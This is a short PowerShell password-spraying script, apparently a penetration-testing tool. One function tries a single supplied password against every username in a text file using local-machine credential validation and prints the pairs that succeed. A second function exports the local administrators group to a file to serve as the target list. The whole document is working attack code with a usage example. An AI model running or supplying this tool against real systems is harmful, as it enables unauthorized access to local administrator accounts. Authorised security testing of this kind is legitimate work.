function Password_Sparay_localUsers{

<#
.SYNOPSIS
Lux(Hai vaknin)
Password spraying is an attack that attempts to access a large number of accounts (usernames) with a few commonly used passwords. Traditional brute-force attacks attempt to gain unauthorized access to a single account by guessing the password.

.PARAMETER File_location
TXT File contain LocalAdmins usernames seperated by new line.

.EXAMPLE
PS > Password_Sparay_localUsers -password Aa123456 -File_location MyFile.txt

#>

Param(
    [Parameter(Mandatory)][string]$password,
    [Parameter(ParameterSetName="File_location")][String]$File_location)
    
    

    switch ($PsCmdlet.ParameterSetName){
    "File_location" {
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
     $computer = $env:COMPUTERNAME
     $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer)
     Get-Content $File_location | ForEach-Object {
     if($obj.ValidateCredentials($_, $password)){
     Write-Host $_ $password -ForegroundColor Green 
     } 
     }
  }
}

function GetUserList{
$s=Get-LocalGroupMember administrators
$s | select -ExpandProperty "Name" | Out-File -FilePath UserList.txt
}

}